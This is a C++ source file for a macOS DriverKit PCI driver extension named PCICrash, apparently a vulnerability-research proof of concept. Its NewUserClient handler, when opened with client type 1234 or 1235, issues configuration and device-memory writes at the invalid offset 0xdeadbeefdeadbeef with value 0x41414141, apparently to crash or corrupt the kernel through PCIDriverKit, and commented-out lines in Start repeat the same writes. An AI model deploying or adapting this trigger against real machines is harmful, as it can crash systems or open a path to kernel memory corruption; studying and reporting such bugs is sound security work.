//
//  PCICrash.cpp
//  PCICrash
//
//  Created by Zhuowei Zhang on 2022-06-19.
//

#include <os/log.h>

#include <DriverKit/IOUserServer.h>
#include <DriverKit/IOLib.h>
#include <PCIDriverKit/PCIDriverKit.h>

#include "PCICrash.h"

enum kPCIDriverKitMemoryAccessOperation
{
    kPCIDriverKitMemoryAccessOperationDeviceMemoryIndexMask = 0x000000FF,
    kPCIDriverKitMemoryAccessOperationAccessTypeMask        = 0x0000FF00,
    kPCIDriverKitMemoryAccessOperationDeviceRead            = 0x00000100,
    kPCIDriverKitMemoryAccessOperationDeviceWrite           = 0x00000200,
    kPCIDriverKitMemoryAccessOperationConfigurationRead     = 0x00000400,
    kPCIDriverKitMemoryAccessOperationConfigurationWrite    = 0x00000800,
    kPCIDriverKitMemoryAccessOperationIORead                = 0x00001000,
    kPCIDriverKitMemoryAccessOperationIOWrite               = 0x00002000,

    kPCIDriverKitMemoryAccessOperationSizeMask = 0x000F0000,
    kPCIDriverKitMemoryAccessOperation8Bit     = 0x00010000,
    kPCIDriverKitMemoryAccessOperation16Bit    = 0x00020000,
    kPCIDriverKitMemoryAccessOperation32Bit    = 0x00040000,
    kPCIDriverKitMemoryAccessOperation64Bit    = 0x00080000
};

static const char* failReason;
void TryEverything(void);

struct PCICrash_IVars
{
    IOPCIDevice* pciDevice;
};

static PCICrash* gPCICrash;

kern_return_t
IMPL(PCICrash, Start)
{
    kern_return_t ret;
    ret = Start(provider, SUPERDISPATCH);
    if(ret != kIOReturnSuccess)
    {
        failReason = "not start success";
        return kIOReturnNoDevice;
    }
    os_log(OS_LOG_DEFAULT, "Hello World");
    // TODO(zhuowei): we never free this...
    ivars = IONewZero(PCICrash_IVars, 1);

    if(ivars == NULL)
    {
        failReason = "no ivars";
        return kIOReturnNoDevice;
    }
    ivars->pciDevice = OSDynamicCast(IOPCIDevice, provider);
    if(ivars->pciDevice == NULL)
    {
        failReason = "no pcidevice cast";
        Stop(provider);
        return kIOReturnNoDevice;
    }
    ivars->pciDevice->retain();

    if(ivars->pciDevice->Open(this, 0) != kIOReturnSuccess)
    {
        failReason = "no open";
        Stop(provider);
        return kIOReturnNoDevice;
    }
    //PCIMemoryWrite64(ivars->pciDevice, this, 0, 0x414141414141ull, 0xdeadbeefdeadbeefull);
    //ivars->pciDevice->ConfigurationWrite32(0xdeadbeefdeadbeefull, 0x41414141);
    RegisterService();
    os_log(OS_LOG_DEFAULT, "PCICrashDEXT: Driver started!");
    failReason = "started";
    gPCICrash = this;
    return ret;
}

kern_return_t
IMPL(PCICrash, Stop) {
    if (ivars->pciDevice) {
        ivars->pciDevice->Close(this, 0);
    }
    OSSafeReleaseNULL(ivars->pciDevice);
    IOSafeDeleteNULL(ivars, PCICrash_IVars, 1);
    return Stop(provider, SUPERDISPATCH);
}

kern_return_t
IMPL(PCICrash, NewUserClient)
{
    os_log(OS_LOG_DEFAULT, "PCICrashDEXT: new user client: failReason = %s", failReason);
    if (type == 1234 && ivars && ivars->pciDevice) {
        ivars->pciDevice->ConfigurationWrite32(0xdeadbeefdeadbeefull, 0x41414141);
    }
    if (type == 1235 && ivars && ivars->pciDevice) {
        uint64_t operation = kPCIDriverKitMemoryAccessOperationDeviceWrite | kPCIDriverKitMemoryAccessOperation64Bit;
        kern_return_t err = gPCICrash->ivars->pciDevice->_MemoryAccess(operation, 0xdeadbeefdeadbeefull, 0x41414141, nullptr, this, 0);
        os_log(OS_LOG_DEFAULT, "PCICrashDEXT: err %x", err);
    }
    return kIOReturnUnsupported;
}
